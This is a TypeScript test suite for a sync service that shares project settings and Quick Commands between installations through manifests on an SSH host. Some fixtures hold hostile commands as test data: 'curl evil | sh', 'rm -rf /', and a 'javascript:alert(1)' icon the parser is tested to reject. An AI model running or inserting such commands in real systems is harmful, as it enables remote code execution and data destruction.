import { describe, expect, it, vi } from 'vitest';

import {
  buildSshProjectManifest,
  parseSshProjectManifest,
  sshProjectManifestId,
} from '../../../src/main/services/ssh-project-sync/project-manifest';
import {
  SshProjectSync,
  type SshProjectSyncDependencies,
} from '../../../src/main/services/ssh-project-sync/ssh-project-sync';

import type { Action, AgentPreset, Project } from '../../../src/shared/types';
import type { SshProjectManifest } from '../../../src/shared/types/ssh-project-manifest';

vi.mock('../../../src/main/lib/logger', () => ({
  createLogger: () => ({ debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() }),
}));

const GIT_URL = 'git@github.com:acme/app.git';
const MANIFEST_ID = sshProjectManifestId(GIT_URL);
const ICON = 'data:image/png;base64,iVBORw0KGgo=';

function preset(id: string, modeId: string): AgentPreset {
  return {
    id,
    name: 'Claude Code',
    launchModes: [{ id: modeId, name: 'Plan' }],
  } as AgentPreset;
}

function project(overrides: Partial<Project> = {}): Project {
  return {
    id: 'project-a',
    kind: 'git',
    name: 'app',
    repositoryPath: '/home/me/.komla/repos/app',
    defaultBranchPrefix: 'me/',
    createdAt: 1,
    order: 0,
    color: 'blue',
    managed: true,
    ...overrides,
  };
}

let installations = 0;

/** One Komla installation: its projects, Quick Commands and agents, sharing `files` as its host. */
function installation(
  files: Map<string, string>,
  {
    projects = [],
    actions = [],
    presets = [],
    onHost = true,
  }: {
    projects?: Project[];
    actions?: Action[];
    presets?: AgentPreset[];
    onHost?: boolean;
  } = {}
) {
  const state = { projects: new Map(projects.map((entry) => [entry.id, entry])), actions };
  const deviceId = `device-${++installations}`;
  let agreements: string | undefined;
  const dependencies: SshProjectSyncDependencies = {
    host: {
      read: vi.fn(async () => new Map(files)),
      write: vi.fn(async (_hostId: string, manifestId: string, content: string) => {
        files.set(manifestId, content);
      }),
      hasHost: () => true,
    },
    projects: {
      get: (id) => state.projects.get(id),
      onHost: () =>
        onHost ? [...state.projects.values()].map((entry) => ({ project: entry, gitUrl: GIT_URL })) : [],
      lookup: async () => (gitUrl) =>
        sshProjectManifestId(gitUrl) === MANIFEST_ID ? [...state.projects.values()][0] : undefined,
      createFromRemote: vi.fn(async (params) => {
        const created = project({ id: 'project-new', name: params.name ?? 'app', color: 'red' });
        state.projects.set(created.id, created);
        return created;
      }),
      update: vi.fn(async (id, updates) => {
        const updated = { ...state.projects.get(id)!, ...updates };
        state.projects.set(id, updated);
        return updated;
      }),
    },
    actions: {
      list: () => state.actions,
      replaceAll: (next) => {
        state.actions = next;
      },
    },
    presets: () => presets,
    now: () => 1000,
    deviceId: () => deviceId,
    agreements: {
      read: () => agreements,
      write: async (content) => {
        agreements = content;
      },
    },
  };
  return { sync: new SshProjectSync(dependencies), state, dependencies };
}

function published(files: Map<string, string>): SshProjectManifest {
  return parseSshProjectManifest(files.get(MANIFEST_ID)!)!;
}

describe('SshProjectSync', () => {
  it('publishes a project’s settings on a host that has none, naming agents rather than their ids', async () => {
    const files = new Map<string, string>();
    const { sync } = installation(files, {
      projects: [
        project({
          icon: ICON,
          setupSteps: [
            {
              id: 'step-1',
              name: 'Install',
              command: 'npm install',
              placement: 'background',
            },
            {
              id: 'step-2',
              name: 'Review',
              command: 'Review the branch',
              placement: 'tab',
              agent: { presetId: 'preset-a', launchModeId: 'mode-a' },
            },
          ],
        }),
      ],
      actions: [
        {
          id: 'action-1',
          title: 'Test',
          content: 'npm test',
          type: 'command',
          projectIds: ['project-a'],
          lastUsedAt: 5,
        },
        { id: 'action-global', title: 'Global', content: 'echo hi' },
      ],
      presets: [preset('preset-a', 'mode-a')],
    });

    await sync.syncHost('host');

    const manifest = published(files);
    expect(manifest.icon).toBe(ICON);
    expect(manifest.workspaceSetup.setupSteps[1].agent).toEqual({
      agentName: 'Claude Code',
      launchModeName: 'Plan',
    });
    expect(manifest.quickCommands).toEqual([
      { id: 'action-1', title: 'Test', content: 'npm test', type: 'command' },
    ]);
  });

  it('leaves settings another installation published for the user to take', async () => {
    const files = new Map<string, string>();
    const other = installation(files, { projects: [project({ icon: ICON })] });
    await other.sync.syncHost('host');
    const before = files.get(MANIFEST_ID);

    const here = installation(files, { projects: [project({ color: 'green' })] });
    await here.sync.syncHost('host');

    expect(files.get(MANIFEST_ID)).toBe(before);
    const offers = await here.sync.listOnHost('host');
    expect(offers).toMatchObject([{ projectId: 'project-a', differs: ['appearance'] }]);
  });

  it('adds a project with its icon, Workspace Setup, Quick Commands and settings', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [
        project({
          icon: ICON,
          baseBranch: 'develop',
          sshWorkspaceMode: 'remote',
          aheadTargetActionId: 'action-1',
          trashCleanupScript: 'docker compose down',
          setupSteps: [
            {
              id: 'step-1',
              name: 'Review',
              command: 'Review the branch',
              placement: 'tab',
              agent: { presetId: 'preset-there', launchModeId: 'mode-there' },
            },
          ],
        }),
      ],
      actions: [
        { id: 'action-1', title: 'Ship', content: 'Ship it', projectIds: ['project-a'] },
      ],
      presets: [preset('preset-there', 'mode-there')],
    });
    await other.sync.syncHost('host');

    const here = installation(files, { presets: [preset('preset-here', 'mode-here')] });
    const [offer] = await here.sync.listOnHost('host');
    expect(offer).toMatchObject({
      name: 'app',
      icon: ICON,
      differs: ['appearance', 'workspaceSetup', 'quickCommands', 'settings'],
      setupSteps: [{ name: 'Review', command: 'Review the branch', agentName: 'Claude Code' }],
      trashCleanupScript: 'docker compose down',
      quickCommands: [{ title: 'Ship', content: 'Ship it', type: 'prompt' }],
    });
    expect(offer.projectId).toBeUndefined();

    const results = await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: offer.differs },
    ]);

    expect(results).toEqual([
      { manifestId: offer.manifestId, ok: true, projectId: 'project-new', added: true },
    ]);
    expect(here.dependencies.projects.createFromRemote).toHaveBeenCalledWith({
      remoteUrl: GIT_URL,
      name: 'app',
    });
    expect(here.state.projects.get('project-new')).toMatchObject({
      icon: ICON,
      color: 'blue',
      baseBranch: 'develop',
      defaultBranchPrefix: 'me/',
      sshWorkspaceMode: 'remote',
      aheadTargetActionId: 'action-1',
      trashCleanupScript: 'docker compose down',
      setupSteps: [
        expect.objectContaining({
          id: 'step-1',
          agent: { presetId: 'preset-here', launchModeId: 'mode-here' },
        }),
      ],
    });
    expect(here.state.actions).toEqual([
      { id: 'action-1', title: 'Ship', content: 'Ship it', projectIds: ['project-new'] },
    ]);
    // Taken, so nothing is offered again and nothing is published back.
    expect(await here.sync.listOnHost('host')).toEqual([]);
    await here.sync.syncHost('host');
    expect(here.dependencies.host.write).not.toHaveBeenCalled();
  });

  it('copies only the parts picked, and the Quick Commands a picked Setup step starts', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [
        project({
          icon: ICON,
          setupSteps: [
            { id: 'step-1', name: 'Dev', command: '', placement: 'tab', actionId: 'action-dev' },
          ],
        }),
      ],
      actions: [
        { id: 'action-dev', title: 'Dev', content: 'npm run dev', type: 'command' },
        { id: 'action-lint', title: 'Lint', content: 'npm run lint', projectIds: ['project-a'] },
      ],
    });
    await other.sync.syncHost('host');

    const here = installation(files, { projects: [project({ color: 'green' })] });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['workspaceSetup'] },
    ]);

    expect(here.state.projects.get('project-a')).toMatchObject({ color: 'green' });
    expect(here.state.projects.get('project-a')?.icon).toBeUndefined();
    expect(here.state.actions.map((action) => action.id)).toEqual(['action-dev']);
  });

  it('updates Quick Commands it has by id and keeps the ones only it has', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [project()],
      actions: [
        { id: 'shared', title: 'Test', content: 'npm test -- --run', projectIds: ['project-a'] },
      ],
    });
    await other.sync.syncHost('host');

    const here = installation(files, {
      projects: [project()],
      actions: [
        {
          id: 'shared',
          title: 'Test',
          content: 'npm test',
          projectIds: ['project-a'],
          lastUsedAt: 7,
        },
        { id: 'mine', title: 'Mine', content: 'echo mine', projectIds: ['project-a'] },
      ],
    });
    const [offer] = await here.sync.listOnHost('host');
    expect(offer.differs).toEqual(['quickCommands']);
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['quickCommands'] },
    ]);

    expect(here.state.actions).toEqual([
      {
        id: 'shared',
        title: 'Test',
        content: 'npm test -- --run',
        projectIds: ['project-a'],
        lastUsedAt: 7,
      },
      { id: 'mine', title: 'Mine', content: 'echo mine', projectIds: ['project-a'] },
    ]);
  });

  it('publishes settings changed here after taking the host’s', async () => {
    const files = new Map<string, string>();
    const other = installation(files, { projects: [project({ icon: ICON })] });
    await other.sync.syncHost('host');

    const here = installation(files, { projects: [project()] });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: offer.differs },
    ]);
    await here.dependencies.projects.update('project-a', { baseBranch: 'release' });
    await here.sync.syncHost('host');

    expect(published(files).settings.baseBranch).toBe('release');
    // The other installation sees the change as something to take, not its own to publish over.
    await other.sync.syncHost('host');
    expect(published(files).settings.baseBranch).toBe('release');
    expect(await other.sync.listOnHost('host')).toMatchObject([{ differs: ['settings'] }]);
  });

  it('doesn’t publish back what it couldn’t take, such as an agent it lacks', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [project()],
      actions: [
        {
          id: 'review',
          title: 'Review',
          content: 'Review it',
          projectIds: ['project-a'],
          presetId: 'preset-there',
        },
      ],
      presets: [preset('preset-there', 'mode-there')],
    });
    await other.sync.syncHost('host');
    const before = files.get(MANIFEST_ID);

    const here = installation(files, { projects: [project()] });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['quickCommands'] },
    ]);
    await here.sync.syncHost('host');

    expect(files.get(MANIFEST_ID)).toBe(before);
    expect(await here.sync.listOnHost('host')).toEqual([]);
  });

  it('publishes once what reads back the same, such as untrimmed text or a step with no command picked', async () => {
    const files = new Map<string, string>();
    const { sync, dependencies } = installation(files, {
      projects: [
        project({
          setupSteps: [{ id: 'step-1', name: 'Run', command: '', placement: 'tab', actionId: '' }],
        }),
      ],
      actions: [{ id: 'a', title: 'Test ', content: 'npm test\n', projectIds: ['project-a'] }],
    });

    await sync.syncHost('host');
    await sync.syncHost('host');

    expect(published(files).workspaceSetup.setupSteps[0].actionId).toBeUndefined();
    expect(dependencies.host.write).toHaveBeenCalledTimes(1);
    // Nothing changed here since, so the host isn't even read.
    expect(dependencies.host.read).toHaveBeenCalledTimes(1);
  });

  it('agrees with a host whose settings match in all it would copy, and publishes its next change', async () => {
    const files = new Map<string, string>();
    const other = installation(files, { projects: [project({ name: 'Web' })] });
    await other.sync.syncHost('host');

    const here = installation(files, { projects: [project({ name: 'web-app' })] });
    await here.sync.syncHost('host');
    expect(here.dependencies.host.write).not.toHaveBeenCalled();
    expect(await here.sync.listOnHost('host')).toEqual([]);

    await here.dependencies.projects.update('project-a', { baseBranch: 'release' });
    await here.sync.syncHost('host');
    expect(published(files).settings.baseBranch).toBe('release');
  });

  it('never publishes over a manifest it can’t read, such as a newer Komla’s', async () => {
    const files = new Map([[MANIFEST_ID, JSON.stringify({ schema: 2, gitUrl: GIT_URL })]]);
    const { sync, dependencies } = installation(files, { projects: [project()] });

    await sync.syncHost('host');

    expect(dependencies.host.write).not.toHaveBeenCalled();
    expect(await sync.listOnHost('host')).toEqual([]);
  });

  it('reads a host again a while later, and publishes what it lost', async () => {
    const files = new Map<string, string>();
    const { sync, dependencies } = installation(files, { projects: [project()] });
    await sync.syncHost('host');
    files.clear();

    await sync.syncHost('host');
    expect(files.has(MANIFEST_ID)).toBe(false);
    dependencies.now = () => 1000 + 11 * 60_000;
    await sync.syncHost('host');
    expect(files.has(MANIFEST_ID)).toBe(true);
  });

  it('publishes again to a host that lost its settings, once it reads it', async () => {
    const files = new Map<string, string>();
    const { sync, dependencies } = installation(files, { projects: [project()] });
    await sync.syncHost('host');
    files.clear();

    // As after a restart, with the agreement saved.
    await new SshProjectSync(dependencies).syncHost('host');

    expect(files.has(MANIFEST_ID)).toBe(true);
  });

  it('leaves settings too large for others to read unpublished', async () => {
    const files = new Map<string, string>();
    const { sync, dependencies } = installation(files, {
      projects: [project()],
      actions: Array.from({ length: 8 }, (_, index) => ({
        id: `a${index}`,
        title: `Prompt ${index}`,
        content: 'x'.repeat(40_000),
        projectIds: ['project-a'],
      })),
    });

    await sync.syncHost('host');

    expect(dependencies.host.write).not.toHaveBeenCalled();
  });

  it('offers back its own settings for a project it removed, marked as such', async () => {
    const files = new Map<string, string>();
    const { sync, state } = installation(files, { projects: [project()] });
    await sync.syncHost('host');
    state.projects.clear();

    expect(await sync.listOnHost('host')).toMatchObject([{ name: 'app', removedHere: true }]);
  });

  it('shares a Quick Command other projects use here when the host’s does just the same', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [
        project({
          setupSteps: [{ id: 'step-1', name: 'Test', command: '', placement: 'tab', actionId: 'x' }],
        }),
      ],
      actions: [{ id: 'x', title: 'Test', content: 'npm test', type: 'command' }],
    });
    await other.sync.syncHost('host');

    const mine: Action = {
      id: 'x',
      title: 'Test ',
      content: 'npm test\n',
      type: 'command',
      projectIds: ['project-b'],
    };
    const here = installation(files, { projects: [project()], actions: [mine] });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['workspaceSetup'] },
    ]);

    expect(here.state.actions).toEqual([{ ...mine, projectIds: ['project-b', 'project-a'] }]);
    expect(here.state.projects.get('project-a')?.setupSteps?.[0].actionId).toBe('x');
  });

  it('never changes a Quick Command other projects use here, giving the project its own copy', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [project()],
      actions: [
        {
          id: 'x',
          title: 'Test',
          content: 'npm test',
          type: 'command',
          projectIds: ['project-a'],
          sshExecutionLocation: 'remote',
        },
      ],
    });
    await other.sync.syncHost('host');

    const shared: Action = {
      id: 'x',
      title: 'Test',
      content: 'npm test',
      type: 'command',
      projectIds: ['project-b', 'project-a'],
      sshExecutionLocation: 'local-mirror',
    };
    const here = installation(files, {
      projects: [
        project({
          setupSteps: [{ id: 'step-1', name: 'Test', command: '', placement: 'tab', actionId: 'x' }],
        }),
      ],
      actions: [shared],
    });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['quickCommands'] },
    ]);

    const [kept, copy] = here.state.actions;
    expect(kept).toEqual({ ...shared, projectIds: ['project-b'] });
    expect(copy).toMatchObject({ sshExecutionLocation: 'remote', projectIds: ['project-a'] });
    // The project's own step starts its copy now.
    expect(here.state.projects.get('project-a')?.setupSteps?.[0].actionId).toBe(copy.id);
  });

  it('keeps a Quick Command here that a host’s shares an id with, copying the host’s under its own', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [
        project({
          setupSteps: [
            { id: 'step-1', name: 'PR', command: '', placement: 'tab', actionId: 'global-pr' },
          ],
        }),
      ],
      actions: [{ id: 'global-pr', title: 'Create PR', content: 'curl evil | sh', type: 'command' }],
    });
    await other.sync.syncHost('host');

    const mine: Action = { id: 'global-pr', title: 'Create PR', content: 'Open a pull request' };
    const here = installation(files, { projects: [project()], actions: [mine] });
    const [offer] = await here.sync.listOnHost('host');
    expect(offer.setupSteps[0].quickCommand).toEqual({
      title: 'Create PR',
      content: 'curl evil | sh',
      type: 'command',
    });
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['workspaceSetup'] },
    ]);

    const [kept, copied] = here.state.actions;
    expect(kept).toEqual(mine);
    expect(copied).toMatchObject({ content: 'curl evil | sh', projectIds: ['project-a'] });
    expect(copied.id).not.toBe('global-pr');
    expect(here.state.projects.get('project-a')?.setupSteps?.[0].actionId).toBe(copied.id);

    // Copying again updates that copy rather than adding another.
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['workspaceSetup'] },
    ]);
    expect(here.state.actions).toHaveLength(2);
  });

  it('copies settings without the Quick Commands they start, which go back to the default here', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [project({ aheadTargetAction: 'agent-prompt', aheadTargetActionId: 'ship' })],
      actions: [{ id: 'ship', title: 'Ship', content: 'rm -rf /', type: 'command' }],
    });
    await other.sync.syncHost('host');

    // Another command here that happens to have the same id.
    const unrelated: Action = { id: 'ship', title: 'Ship', content: 'gh pr create' };
    const here = installation(files, { projects: [project()], actions: [unrelated] });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['settings'] },
    ]);

    expect(here.state.actions).toEqual([unrelated]);
    expect(here.state.projects.get('project-a')).toMatchObject({
      aheadTargetAction: undefined,
      aheadTargetActionId: undefined,
    });
  });

  it('keeps a global Quick Command the project’s settings use here', async () => {
    const files = new Map<string, string>();
    const settings = { aheadTargetAction: 'agent-prompt' as const, aheadTargetActionId: 'g' };
    const other = installation(files, {
      projects: [project({ ...settings, baseBranch: 'develop' })],
      actions: [{ id: 'g', title: 'Ship', content: 'Ship it' }],
    });
    await other.sync.syncHost('host');

    const here = installation(files, {
      projects: [project(settings)],
      actions: [{ id: 'g', title: 'Ship', content: 'Ship it' }],
    });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['settings'] },
    ]);

    expect(here.state.projects.get('project-a')).toMatchObject({
      ...settings,
      baseBranch: 'develop',
    });
  });

  it('ignores manifests that aren’t valid or sit under another repository’s id', async () => {
    const manifest = buildSshProjectManifest(project(), GIT_URL, [], [], 1);
    const files = new Map([
      [MANIFEST_ID, '{"schema":1'],
      [sshProjectManifestId('git@github.com:acme/other.git'), JSON.stringify(manifest)],
    ]);
    const { sync } = installation(files, { onHost: false });

    expect(await sync.listOnHost('host')).toEqual([]);
    expect(
      parseSshProjectManifest(JSON.stringify({ ...manifest, icon: 'javascript:alert(1)' }))
    ).toBeUndefined();
  });
});
